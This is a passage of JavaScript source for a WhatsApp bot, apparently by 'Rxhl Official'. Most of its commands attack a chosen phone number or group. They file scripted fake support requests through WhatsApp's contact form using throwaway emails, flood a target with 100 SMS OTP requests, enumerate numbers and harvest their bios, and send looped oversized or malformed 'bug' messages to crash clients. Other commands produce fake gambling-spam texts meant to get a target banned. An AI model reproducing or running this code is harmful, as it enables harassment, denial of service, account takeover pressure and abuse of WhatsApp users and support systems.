form = new URLSearchParams()
form.append("jazoest", $form.find("input[name=jazoest]").val())
form.append("lsd", $form.find("input[name=lsd]").val())
form.append("step", "submit")
form.append("country_selector", "+")
form.append("phone_number", `+${targetnya}`,)
form.append("email", email.data[0])
form.append("email_confirm", email.data[0])
form.append("platform", "ANDROID")
form.append("your_message", `Привет, поддержка WhatsApp. Несколько дней назад я открыл приложение WhatsApp, но получил уведомление о том, что моя учетная запись WhatsApp не авторизована, и попросил зарегистрировать новый номер телефона. Почему мой номер не может использовать WhatsApp? Я считаю, что я никогда не нарушал политику WhatsApp, никогда не причинял вреда другим пользователям WhatsApp и использую WhatsApp только для бизнеса своей компании. Пожалуйста, повторно активируйте мой номер WhatsApp, поскольку этот номер содержит важные данные для моего бизнеса и деятельности. Пожалуйста, обработайте мой запрос как можно быстрее.`)
form.append("__user", "0")
form.append("__a", "1")
form.append("__csr", "")
form.append("__req", "8")
form.append("__hs", "19531.BP:whatsapp_www_pkg.2.0.0.0.0")
form.append("dpr", "1")
form.append("__ccg", "UNKNOWN")
form.append("__rev", "1007735016")
form.append("__comment_req", "0")

res = await axioss({
url,
method: "POST",
data: form,
headers: {
cookie
}

})
replyz(`Please wait for the unbanned process for 12 hours🥺🙏`)
payload = String(res.data)
if (payload.includes(`"payload":true`)) {
} else if (payload.includes(`"payload":false`)) {
} else replyz(util.format(res.data))
} catch (err) {replyz(`${err}`)}
} else replyz('Insert Number!')
}
break

case 'unbannedv3': {
if (!isMurbug) return replyz(global.nocreator)
if (m.quoted || q) {
tosend = m.quoted ? m.quoted.sender : q.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
targetnya = tosend.split('@')[0]

try {
axioss = require('axios')
ntah = await axioss.get("https://www.whatsapp.com/contact/noclient/")
email = await axioss.get("https://www.1secmail.com/api/v1/?action=genRandomMailbox&count=199999999999999999995777678776668876677777")
cookie = ntah.headers["set-cookie"].join("; ")
cheerio = require('cheerio');
$ = cheerio.load(ntah.data)
$form = $("form");
url = new URL($form.attr("action"), "https://www.whatsapp.com").href
form = new URLSearchParams()
form.append("jazoest", $form.find("input[name=jazoest]").val())
form.append("lsd", $form.find("input[name=lsd]").val())
form.append("step", "submit")
form.append("country_selector", "+")
form.append("phone_number", `+${targetnya}`,)
form.append("email", email.data[0])
form.append("email_confirm", email.data[0])
form.append("platform", "ANDROID")
form.append("your_message", `Здравствуйте, доброе утро, WhatsApp. Я пользователь WhatsApp со следующим номером ${targetnya}. У меня возникла проблема с блокировкой моего номера WhatsApp. Когда я открыл приложение WhatsApp, я получил уведомление: «Эта учетная запись не может использовать приложение WhatsApp». Раньше я отправлял сообщения в чат своей семье только во время работы. и я не считаю, что совершил какое-либо нарушение условий обслуживания WhatsApp. Приношу извинения, я рассматриваю возможность повторной активации заблокированной учетной записи WhatsApp. Спасибо`)
form.append("__user", "0")
form.append("__a", "1")
form.append("__csr", "")
form.append("__req", "8")
form.append("__hs", "19531.BP:whatsapp_www_pkg.2.0.0.0.0")
form.append("dpr", "1")
form.append("__ccg", "UNKNOWN")
form.append("__rev", "1007735016")
form.append("__comment_req", "0")

res = await axioss({
url,
method: "POST",
data: form,
headers: {
cookie
}

})
replyz(`Please wait for the unbanned process for 12 hours🥺🙏`)
payload = String(res.data)
if (payload.includes(`"payload":true`)) {
} else if (payload.includes(`"payload":false`)) {
} else replyz(util.format(res.data))
} catch (err) {replyz(`${err}`)}
} else replyz('Insert number!')
}
break

case 'resetotp': {
if (!isMurbug) return replyz(global.nocreator)
if (m.quoted || q) {
tosend = m.quoted ? m.quoted.sender : q.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
targetnya = tosend.split('@')[0]

try {
axioss = require('axios')
ntah = await axioss.get("https://www.whatsapp.com/contact/noclient/")
email = await axioss.get("https://www.1secmail.com/api/v1/?action=genRandomMailbox&count=199999999999999999995777678776668876677777")
cookie = ntah.headers["set-cookie"].join("; ")
cheerio = require('cheerio');
$ = cheerio.load(ntah.data)
$form = $("form");
url = new URL($form.attr("action"), "https://www.whatsapp.com").href
form = new URLSearchParams()
form.append("jazoest", $form.find("input[name=jazoest]").val())
form.append("lsd", $form.find("input[name=lsd]").val())
form.append("step", "submit")
form.append("country_selector", "+")
form.append("phone_number", `+${targetnya}`,)
form.append("email", email.data[0])
form.append("email_confirm", email.data[0])
form.append("platform", "ANDROID")
form.append("your_message", `Olá, suporte pelo WhatsApp. Alguém tentou fazer login na minha conta do Whatsapp, então estou desconectado da minha conta do Whatsapp, mas infelizmente não consigo mais fazer login na minha conta do Whatsapp porque tenho que esperar 12 horas para receber o código de verificação. Por favor, redefina meu código de verificação do WhatsApp.`)
form.append("__user", "0")
form.append("__a", "1")
form.append("__csr", "")
form.append("__req", "8")
form.append("__hs", "19531.BP:whatsapp_www_pkg.2.0.0.0.0")
form.append("dpr", "1")
form.append("__ccg", "UNKNOWN")
form.append("__rev", "1007735016")
form.append("__comment_req", "0")

res = await axioss({
url,
method: "POST",
data: form,
headers: {
cookie
}

})
replyz(`i have reset the otp on that number and remember it only works if the otp is more than 3 hours🥺🙏`)
payload = String(res.data)
if (payload.includes(`"payload":true`)) {
} else if (payload.includes(`"payload":false`)) {
} else replyz(util.format(res.data))
} catch (err) {replyz(`${err}`)}
} else replyz('Insert number!')
}
break

case 'spamsms': {
if (!isMurbug) return replyz('*Premium only*')
await loading()
const froms = m.quoted ? m.quoted.sender : qtext.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
if (m.quoted || qtext) {
if (froms.startsWith('08')) return replyz('Awali nomor dengan +62')
let nosms = '+' + froms.replace('@s.whatsapp.net', '')
let mal = ["Mozilla/5.0 (X11; Ubuntu; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.87 Safari/537.36 RuxitSynthetic/1.0 v7108827108815046027 t6205049005192687891", "Mozilla/5.0 (X11; Ubuntu; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.87 Safari/537.36 RuxitSynthetic/1.0 v1692361810532096513 t9071033982482470646", "Mozilla/5.0 (X11; Ubuntu; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.87 Safari/537.36 RuxitSynthetic/1.0 v4466439914708508420 t8068951106021062059", "Mozilla/5.0 (X11; Ubuntu; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.87 Safari/537.36 RuxitSynthetic/1.0 v8880767681151577953 t8052286838287810618", "Mozilla/5.0 (X11; Ubuntu; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36 RuxitSynthetic/1.0 v6215776200348075665 t6662866128547677118", "Mozilla/5.0 (X11; Ubuntu; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.87 Safari/537.36 RuxitSynthetic/1.0 v1588190262877692089 t2919217341348717815", "Mozilla/5.0 (X11; Ubuntu; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.87 Safari/537.36 RuxitSynthetic/1.0 v5330150654511677032 t9071033982482470646", "Mozilla/5.0 (Linux; Android 10; M2006C3LG) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.101 Mobile Safari/537.36", "Mozilla/5.0 (Linux; Android 10; M2006C3LG) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.101 Mobile Safari/537.36", "Mozilla/5.0 (Linux; Android 11; vivo 2007) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Mobile Safari/537.36", "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.101 Safari/537.36"]
let ua = mal[Math.floor(Math.random() * mal.length)];
let axios = require('axios').default;
let hd = {
'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3'
};
const dat = {
'phone': nosms
};
for (let x = 0; x < 100; x++) {
axios.post('https://api.myfave.com/api/fave/v1/auth', dat, {
headers: hd
}).then(res => {
console.log(res);
}).catch(err => {
console.log(`[${new Date().toLocaleTimeString()}] Spam (SMS) BY RXHL`);
});
}
} else replyz(`Use of spam SMS number/reply target message*\nExample of spam SMS +6281214281312`)
replyz(`SMS/call spam will be sent to the target number`)
}
break

case 'infobot':
infobot = {
image: rxhlimage,
caption: `*Hallo ${pushname}*
▬▭▬▭▬▭▬▭▬▬▭▬▭▬
*INFO CREATOR AND BOT*
Creator: Rxhl Official
Telegram: @rxhlvro
Base: Rxhl
Versi Bot: V6
▬▭▬▭▬▭▬▭▬▬▭▬▭▬

*SCRIPT DEVELOPED BY RXHL OFFICIAL*`
}
rxhl.sendMessage(from, infobot)
break

case 'sticker':
 if (!quoted) return replyz(`Reply to Video/Image With Caption ${prefix + command}`)
if (/image/.test(mime)) {
await loading()
let media = await quoted.download()
let encmedia = await rxhl.sendImageAsSticker(from, media, m, { packname: global.sticker1, author: global.sticker2 })
await fs.unlinkSync(encmedia)
} else if (/video/.test(mime)) {
if ((quoted.msg || quoted).seconds > 11) return replyz('Maximum 10 seconds!')
let media = await quoted.download()
let encmedia = await rxhl.sendVideoAsSticker(from, media, m, { packname: global.sticker1, author: global.sticker2 })
await fs.unlinkSync(encmedia)
} else {
return replyz(`Send Images/Videos With Caption ${prefix + command}\nVideo Duration 1-9 Seconds`)
}
break

case 'attp':
if (args.length == 0) return replyz(global.notext)
await loading()
ini_txt = args.join(" ")
ini_buffer = await getBuffer(`https://api.lolhuman.xyz/api/${command}?apikey=haikalgans&text=${ini_txt}`)
rxhl.sendMessage(from, { sticker : ini_buffer }, { quoted:m })
break

case 'smeme':
if (!qtext) return replyz(global.notext)
if (!quoted) throw `Reply to Image With Caption ${prefix + command}`
if (/image/.test(mime)) {
await loading()
mee = await rxhl.downloadAndSaveMediaMessage(quoted)
mem = await uptotelegra(mee)
kaytid = await getBuffer(`https://api.memegen.link/images/custom/-/${qtext}.png?background=${mem}`)
rxhl.sendImageAsSticker(from, kaytid, m, { packname: global.sticker1, author: global.sticker2 })
}
break

case 'tiktokmp4':{
if (!qtext) return replyz( `Example : ${prefix + command} link`)
linkRegexx = args.join(" ")
codedd = linkRegexx.split("https://vt.tiktok.com/")[1]
if (!codedd) return replyz("Link Invalid")
await loading()
require('./lib/tiktok').Tiktok(q).then( data => {
rxhl.sendMessage(from, { caption: `Rxhl Official!`, video: { url: data.watermark }}, {quoted:m})
})}
break

case 'inspect': case 'getidgrup': {
if (!isMurbug) return replyz(global.nocreator)
if (!qtext) return replyz('Link?')
let linkRegex = args.join(" ")
let coded = linkRegex.split("https://chat.whatsapp.com/")[1]
if (!coded) return replyz("Link Invalid")
rxhl.query({
tag: "iq",
attrs: {
type: "get",
xmlns: "w:g2",
to: "@g.us"
},
content: [{ tag: "invite", attrs: { code: coded } }]
}).then(async(res) => { 
tekse = `${res.content[0].attrs.id ? res.content[0].attrs.id : "undefined"}`
replyz(tekse)
})}
break

case 'tiktokmp3':{
if (!qtext) return replyz( `Example : ${prefix + command} link`)
linkRegexx = args.join(" ")
codedd = linkRegexx.split("https://vt.tiktok.com/")[1]
if (!codedd) return replyz("Link Invalid")
await loading()
require('./lib/tiktok').Tiktok(q).then( data => {
rxhl.sendMessage(from, { audio: { url: data.audio }, mimetype: 'audio/mp4' }, { quoted: m })
})
}
break

case 'startytmp3':{
if (!q) return replyz(`Example : ${prefix + command} karna su sayang`)
const rxhlplay = require('./lib/ytdl2')
const { fetchBuffer } = require("./lib/storage2")
let yts = require("youtube-yts")
let search = await yts(q)
let anup3k = search.videos[0]
const pl= await rxhlplay.mp3(anup3k.url)
await rxhl.sendMessage(from,{
audio: fs.readFileSync(pl.path),
fileName: anup3k.title + '.mp3',
mimetype: 'audio/mp4', ptt: true,
contextInfo:{
externalAdReply:{
title:anup3k.title,
body: `Rxhl Official`,
thumbnail: await fetchBuffer(pl.meta.image),
mediaType:2,
mediaUrl:anup3k.url,
}

},
},{quoted:m})
await fs.unlinkSync(pl.path)
}
break

case 'yts': case 'ytsearch': {
if (!q) return replyz(`Example : ${prefix + command} story wa anime`)
yts = require("yt-search")
search = await yts(q)
nyaabanaayts = 'YouTube Search\n\n Result From '+q+'\n\n'
no = 1
for (let i of search.all) {
hasilpencarian = `${nyaabanaayts}\nNo : ${no++}\n Type : ${i.type}\n Video ID : ${i.videoId}\n Title : ${i.title}\n Views : ${i.views}\n Duration : ${i.timestamp}\n Uploaded : ${i.ago}\n Url : ${i.url}\n\n─────────────────\n\n`
}
rxhl.sendMessage(from, { image: { url: search.all[0].thumbnail },  caption: hasilpencarian }, { quoted: m })
}
break

case 'style': case 'styletext': {
let { styletext } = require('./lib/scraper')
if (!q) return replyz('Enter Query text!')
let anu = await styletext(q)
let teks = `Style Text From ${q}\n\n`
for (let i of anu) {
teks += `*${i.name}* : ${i.result}\n\n`
}
replyz(teks)
}
break

case 'fliptext': {
if (args.length < 1) return replyz(`Example:\n${prefix}fliptext rxhl`)
quere = args.join(" ")
flipe = quere.split('').reverse().join('')
replyz(`\`\`\`「 FLIP TEXT 」\`\`\`\n*•> Normal :*\n${quere}\n*•> Flip :*\n${flipe}`)
}
break

case 'setppbot': case 'setbotpp': {
if (!isCreator) return replyz(global.nocreator)
if (!quoted) return replyz(`Send/Reply Image With Caption ${prefix + command}`)
if (!/image/.test(mime)) return replyz(`Send/Reply Image With Caption ${prefix + command}`)
if (/webp/.test(mime)) return replyz(`Send/Reply Image With Caption ${prefix + command}`)
var medis = await rxhl.downloadAndSaveMediaMessage(quoted)
if (args[0] == `/full`) {
var { img } = await generateProfilePicture(medis)
await rxhl.query({
tag: 'iq',
attrs: {
to: botNumber,
type:'set',
xmlns: 'w:profile:picture'
},
content: [
{
tag: 'picture',
attrs: { type: 'image' },
content: img
}
]
})
fs.unlinkSync(medis)
replyz(`Success`)
} else {
var memeg = await rxhl.updateProfilePicture(botNumber, { url: medis })
fs.unlinkSync(medis)
replyz(`Success`)
}
}
break

case 'tiktokgirl':
replyz('Tunggu')
asupan = JSON.parse(fs.readFileSync('./lib/tiktok/tiktokgirl.json'))
hasil = pickRandom(asupan)
rxhl.sendMessage(from, { caption: 'Sukses', video: { url: hasil.url }}, { quoted: m })
break

case 'tiktokghea':
replyz('Tunggu')
asupan = JSON.parse(fs.readFileSync('./lib/tiktok/gheayubi.json'))
hasil = pickRandom(asupan)
rxhl.sendMessage(from, { caption: 'Sukses', video: { url: hasil.url }}, { quoted: m })
break

case 'tiktoknukhty':
replyz('Tunggu')
asupan = JSON.parse(fs.readFileSync('./lib/tiktok/ukhty.json'))
hasil = pickRandom(asupan)
rxhl.sendMessage(from, { caption: 'Sukses', video: { url: hasil.url }}, { quoted: m })
break

case 'tiktoksantuy':
replyz('Tunggu')
asupan = JSON.parse(fs.readFileSync('./lib/tiktok/santuy.json'))
hasil = pickRandom(asupan)
rxhl.sendMessage(from, { caption: 'Sukses', video: { url: hasil.url }}, { quoted: m })
break

case 'tiktokkayes':
replyz('Tunggu')
asupan = JSON.parse(fs.readFileSync('./lib/tiktok/kayes.json'))
hasil = pickRandom(asupan)
rxhl.sendMessage(from, { caption: 'Sukses', video: { url: hasil.url }}, { quoted: m })
break

case 'tiktokpanrika':
replyz('Tunggu')
asupan = JSON.parse(fs.readFileSync('./lib/tiktok/panrika.json'))
hasil = pickRandom(asupan)
rxhl.sendMessage(from, { caption: 'Sukses', video: { url: hasil.url }}, { quoted: m })
break

case 'tiktoknotnot':
replyz('Tunggu')
asupan = JSON.parse(fs.readFileSync('./lib/tiktok/notnot.json'))
hasil = pickRandom(asupan)
rxhl.sendMessage(from, { caption: 'Sukses', video: { url: hasil.url }}, { quoted: m })
break

case 'nowa': {
if (!isMurbug) return replyz(global.nocreator)
if (!q) return replyz(`insert Number, example: ${prefix+command} 62853388888xxx`)
var noteks = args[0]
if (!noteks.includes('x')) return replyz('Enter the suffix x to find the number?')
function countInstances(string, word) {
return string.split(word).length - 1;
}
var nomer0 = noteks.split('x')[0]
var nomer1 = noteks.split('x')[countInstances(noteks, 'x')] ? noteks.split('x')[countInstances(noteks, 'x')]: ''
var random_length = countInstances(noteks, 'x')
if (random_length > 4) {
  return replyz('Maaf, hanya bisa mencari nomor dengan maksimal 4 x')
}
var random;
replyz('Loading')
if (random_length == 1) {
  random = 10
} else if (random_length == 2) {
  random = 100
} else if (random_length == 3) {
  random = 1000
} else if (random_length == 4) {
  random = 10000
}
var nomerny = `Have a bio\n`
var no_bio = `\nWithout Bio / Default bio.\n`
var no_watsap = `\nNot registered on whatsapp\n`
var data = {}
for (let i = 0; i < random; i++) {
  var nu = ['1','2','3','4','5','6','7','8','9']
  var t1 = nu[Math.floor(Math.random() * nu.length)]
  var t2 = nu[Math.floor(Math.random() * nu.length)]
  var t3 = nu[Math.floor(Math.random() * nu.length)]
  var t4 = nu[Math.floor(Math.random() * nu.length)]
  var rndm;
  if (random_length == 1) {
    rndm = `${t1}`
  } else if (random_length == 2) {
    rndm = `${t1}${t2}`
  } else if (random_length == 3) {
    rndm = `${t1}${t2}${t3}`
  } else if (random_length == 4) {
    rndm = `${t1}${t2}${t3}${t4}`
  }
  var anu = await rxhl.onWhatsApp(`${nomer0}${i}${nomer1}@s.whatsapp.net`);
  var anuu = anu.length !== 0 ? anu: false
  try {
    try {
      var anu1 = await rxhl.fetchStatus(anu[0].jid)
    } catch {
      var anu1 = '401'
    }
    if (anu1 == '401' || anu1.status.length == 0) {
      no_bio += `wa.me/${anu[0].jid.split("@")[0]}\n`
    } else {
      const year = moment(anu1.setAt).tz('Asia/Jakarta').format('YYYY');
      if (!(year in data)) {
        data[year] = [];
      }
      data[year].push(`wa.me/${anu[0].jid.split("@")[0]}\nBio : ${anu1.status}\nDate : ${moment(anu1.setAt).tz('Asia/Jakarta').format('HH:mm:ss DD/MM/YYYY')}\n\n`);
    }
  } catch {
    no_watsap += `${nomer0}${i}${nomer1}\n`
  }
}
const bio = Object.keys(data)
.map((key) => {
  return `*[ ${key} ]*\n${data[key].join('')}`
})
.join('\n')
const hasil = `Results of\n${noteks}:\n\n${nomerny}${bio}${no_bio}${no_watsap}\n\n.`
replyz(hasil)
}
break

case 'bugcrash': 
if (!isMurbug) return replyz(global.nocreator)
if (!q) return replyz('Insert Target number')
Pe = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : qtext.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
jumlah = 20
sendVariousMessages(Pe, jumlah)
await sleep(2000)
replyz(`*</> Successfully sending bug to ${Pe} Please pause for 3 minutes*`)
break

case 'bugcrashv2': 
if (!isMurbug) return replyz(global.nocreator)
if (!q) return replyz('Insert Id Group')
Pe = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : qtext.replace(/[^0-9]/g,'')+"@g.us"
jumlah = 20
sendVariousMessages(Pe, jumlah)
await sleep(2000)
replyz(`*</> Successfully sending bug to ${Pe} Please pause for 3 minutes*`)
break

case 'bugcrashv3': 
if (!isMurbug) return replyz(global.nocreator)

jumlah = 20
sendVariousMessages(from, jumlah)
await sleep(2000)
replyz(`*</> Successfully sent a bug. Please pause for 3 minutes*`)
break

case 'ytmp3': case 'youtubemp3': {
if (!isMurbug) return replyz('*.*')
if (!q) return replyz(`Example : ${prefix + command} https://youtube.com/watch?v=PtFMh6Tccag%2`)
await loading()
downloadMp3(q)
}
break

case 'cek?': {
replyz('Bot Ready to Use 🤗')
}
break

case 'bugvid1':
if (!isMurbug) return replyz('*.*')
bugvid1 = fs.readFileSync('./lib/video/bug1.mp4')
rxhl.sendMessage(from, {video: bugvid1},{quoted: rxhlbugnew})
break

case 'bugvid2':
if (!isMurbug) return replyz('*.*')
bugvid1 = fs.readFileSync('./lib/video/bug2.mp4')
rxhl.sendMessage(from, {video: bugvid1},{quoted: rxhlbugnew})
break

case 'paptt':
if (!isMurbug) return replyz(global.nocreator)
if (!q) return replyz(`Example ${prefix + command} foto/video`)
papttfoto = JSON.parse(fs.readFileSync('./lib/paptt-foto.json'))
papttvideo = JSON.parse(fs.readFileSync('./lib/paptt-video.json'))
titid1 = (pickRandom(papttfoto))
titid2 = (pickRandom(papttvideo))
if (q == 'foto') {
replyz("Photos will be sent via private chat ( *PC* )")
rxhl.sendMessage(m.sender, { image: { url: titid1 }, caption: 'Mana Tahan🥵'}, { quoted: m })
} else if (q == 'video') {
replyz("Video will be sent via private chat ( *PC* )")
rxhl.sendMessage(m.sender, { video: { url: titid2 }, caption: 'Mana Tahan🥵'}, { quoted: m })
}
break

case 'tourl': {
if (!isMurbug) return replyz(global.nocreator)
if (!quoted) return replyz(`Reply Media`)
replyz('*please wait a moment*')
let media = await rxhl.downloadAndSaveMediaMessage(quoted)
if (/image/.test(mime)) {
anuh = await TelegraPh(media)
replyz(util.format(anuh))
} else if (/video/.test(mime)) {
anuh = await TelegraPh(media)
replyz(util.format(anuh))
} else if (!/image/.test(mime)) {
anuh = await UploadFileUgu(media)
replyz(util.format(anuh))
}
await fs.unlinkSync(media)       
}
break

case 'txtban1':
if (!isMurbug) return replyz(global.nocreator)
replyz(`Hola😁, ¿necesitas dinero? Ofrezco un sitio de apuestas en línea con premios en metálico de $700 y condiciones simples. Puedes hacer un depósito mínimo de $70 y puedes duplicar tu dinero.
💰 Realice un depósito inmediatamente en mi sitio de apuestas en línea y obtenga la mayor cantidad de dinero posible. registrarse en mi sitio de apuestas en línea a través de
Enlace : https://registrarse.en.el.sitio.de.apuestas/
Correo electrónico : support@support.whatsapp.com
Whatsapp : https://api.whatsapp.com/send?phone=`)
break

case 'txtban2':
if (!isMurbug) return replyz(global.nocreator)
replyz(`Hola, ¿Necesitas un trabajo para ganar dinero? Quiero ofrecerte un trabajo muy fácil y podrás duplicar todo tu dinero. Te ofrezco un trabajo, concretamente ser administrador de un sitio de juegos de azar online con un premio de 900$ y un depósito mínimo de 70$. Si estás interesado en aceptar una oferta de trabajo mía, puedes comunicarte al número de soporte 👇
https://api.whatsapp.com/send?phone=
💰 También puedes participar en este juego de apuestas en línea registrándote en nuestro sitio y realizando un depósito mínimo de 70$. Vamos, deposita inmediatamente para duplicar tu dinero 💸. Regístrese en nuestro sitio de apuestas en línea y el enlace de registro está disponible a continuación 👇
https://registrarse.en.el.sitio.de.apuestas/
*support@support.whatsapp.com*`)
break

case 'txtban3':
if (!isMurbug) return replyz(global.nocreator)
replyz(`🎲 ONLINE-WETSEITE 🎲
Hallo, ich komme von einem Online-Glücksspielseitenunternehmen namens rxhl888. Ich bin hier, um Ihnen anzubieten, Ihr Geld sofort zu verdoppeln. Sie können es verdoppeln, indem Sie auf der Wettseite rxhl888 einen Nominalwert von 80 $ und einen Preis von 900 $ einzahlen. Bitte registrieren Sie sich über den Link 👇 auf der Online-Glücksspielseite rxhl888
🎮 Wettseiten: https://register.rxhl888.bet/
Alternative zur Registrierung 👇
🎮 Facebook : Rxhl888
🎮 Whatsapp : https://api.whatsapp.com/send?phone=+6289630514341
Bitte registrieren Sie sich, um Ihr Geld zu verdoppeln 🤤`)
break

case 'bugsystem':
if (!isMurbug) return replyz(global.nocreator)
if (!q) return replyz('Insert Target number')
Pe = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : qtext.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
jumlah = 20
sendRepeatedMessages2(Pe, jumlah)
await sleep(2000)
replyz(`*</> Successfully sent bug to number ${Pe}. Please pause commenting for 3 minutes 🤗`)
break

case 'bugsystemv2':
if (!isMurbug) return replyz(global.nocreator)
if (!q) return replyz('Insert id Target')
Pe = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : qtext.replace(/[^0-9]/g,'')+"@g.us"
jumlah = 20
sendRepeatedMessages2(Pe, jumlah)
await sleep(2000)
replyz(`*</> Successfully submitted bug to group ${Pe}. Please pause commenting for 3 minutes 🤗`)
break

case 'bugsystemv3':
if (!isMurbug) return replyz(global.nocreator)

jumlah = 20
sendRepeatedMessages2(from, jumlah)
await sleep(2000)
replyz(`*</> Successfully submitted the bug. Please pause commenting for 3 minutes 🤗`)
break

case 'crash1jam':
if (!isMurbug) return replyz(global.nocreator)
if (!q) return replyz('Insert Target number')
Pe = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : qtext.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
jumlah = 900
sendVariousMessages(Pe, jumlah)
await sleep(2000)
replyz(`*</> Successfully sent bug to number ${Pe}. Please pause commenting for 3 minutes 🤗`)
break

case 'crash1hari':
if (!isMurbug) return replyz(global.nocreator)
if (!q) return replyz('Insert Target number')
Pe = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : qtext.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
jumlah = 21600
sendVariousMessages(Pe, jumlah)
await sleep(2000)
replyz(`*</> Successfully sent bug to number ${Pe}. Please pause commenting for 3 minutes 🤗`)
break

case 'bannedno':
if (!isMurbug) return replyz(global.nocreator)
if (!q) return replyz(' Enter the Target number Prefix "+" and Country Code')
await rxhl.sendMessage(from, {text: `اربح المال بسهولة عبر الإنترنت لمدة ساعة واحدة بسعر 10 آلاف💰.\nفقط في هذا الاستبيان، قم بتسجيل حسابك على الفور، ما عليك سوى رقم واتساب جاهز للاتصال بالإنترنت 🤑.\nلا تفوت هذه الفرصة، سجل الآن باستخدام رمز QR 📄\n\nقم بالرد بـ "1" وانقر على الرابط أدناه 👇\nhttps://server.go-share.top/\n\nوتواصل مع WhatsApp الخاص بي إذا كنت ترغب في الحصول على مكافأة!!🎁\nhttps://api.whatsapp.com/send?phone=${q}`},{quoted: m})
sleep(2000)
replyz(`👆  text above then check Target number 👆\n\n\n ⚠️ Warning: not all numbers can be banned`)
break

case 'xreactpc': {
if (!isMurbug) return replyz(global.nocreator)
if (!q) return replyz('Insert Target number')
Pe = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : qtext.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
await rxhl.sendMessage(Pe, { text: 'RxhL Reaction??', contextInfo:{ isForwarded: true, forwardedNewsletterMessageInfo: { newsletterJid: '120363222395675670@newsletter', newsletterName: `RxhlReaction`.repeat(10000), serverMessageId: 2 } }}, { quoted: xbug2 })
await sleep(2000)
await rxhl.sendMessage(Pe, { react: { text: '🦄', key: { remoteJid: m.chat, fromMe: true, id: quoted.id } } })
}
break

case 'xreactgc': {
if (!isMurbug) return replyz(global.nocreator)
if (!q) return replyz('Insert Id Grup')
Pe = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : qtext.replace(/[^0-9]/g,'')+"@g.us"
await rxhl.sendMessage(Pe, { text: 'RxhL Reaction??', contextInfo:{ isForwarded: true, forwardedNewsletterMessageInfo: { newsletterJid: '120363222395675670@newsletter', newsletterName: `RxhlReaction`.repeat(10000), serverMessageId: 2 } }}, { quoted: xbug2 })
await sleep(2000)
await rxhl.sendMessage(Pe, { react: { text: '🦄', key: { remoteJid: m.chat, fromMe: true, id: quoted.id } } })
}
break

case 'bugiospc': {
if (!isMurbug) return replyz(global.nocreator)
if (!q) return replyz(`Example:\n ${prefix + command} 62xxxxxxxxxx|5`)
victim = qtext.split("|")[0]
amount = qtext.split("|")[1]
Pe = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : victim.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
replyz(responbug)
for (let i = 0; i < amount; i++) {
await rxhl.relayMessage(Pe, {"paymentInviteMessage": {serviceType: "FBPAY",expiryTimestamp: Date.now() + 1814400000}},{})
await sleep(1400)
}
replyz(`</> Successfully submitted bug number ${victim}`)
}
break

case 'bugiosgc': {
if (!isMurbug) return replyz(global.nocreator)
if (!q) return replyz(`Example:\n ${prefix + command} 1937xxxxxx|5`)
victim = qtext.split("|")[0]
amount = qtext.split("|")[1]
Pe = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : victim.replace(/[^0-9]/g,'')+"@g.us"
replyz(responbug)
for (let i = 0; i < amount; i++) {
await rxhl.relayMessage(Pe, {"paymentInviteMessage": {serviceType: "FBPAY",expiryTimestamp: Date.now() + 1814400000}},{})
await sleep(1400)
}
replyz(`</> Successfully submitted bug number ${victim}`)
}
break

case 'bugaudiopc': {
if (!isMurbug) return replyz(global.nocreator)
if (!q) return replyz(`Example:\n ${prefix + command} 62xxxxxxxxxx|5`)
victim = qtext.split("|")[0]
amount = qtext.split("|")[1]
Pe = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : victim.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
replyz(responbug)
rxhlganteng = await getBuffer(`https://github.com/DGXeon/Tiktokmusic-API/raw/master/tiktokmusic/sound2.mp3`)
for (let i = 0; i < amount; i++) {
rxhl.sendMessage(Pe, { "caption": `Rxhl Official`, audio: rxhlganteng, mimetype: 'audio/mpeg', ptt:false,"title":`p`,"contextInfo": {"forwardingScore": 99999999,"isForwarded": true,forwardedNewsletterMessageInfo: { newsletterJid: '120363144038483540@newsletter', newsletterName: `RxhlOfficial`.repeat(10000),serverMessageId: 2 }}},{quoted: xbug2 })
await sleep(1500)
}
replyz(`</> Success Sending ${command} to number ${Pe}`)
}
break

case 'bugaudiogc': {
if (!isMurbug) return replyz(global.nocreator)
if (!q) return replyz(`Example:\n ${prefix + command} 1937xxxxxx|5`)
victim = qtext.split("|")[0]
amount = qtext.split("|")[1]
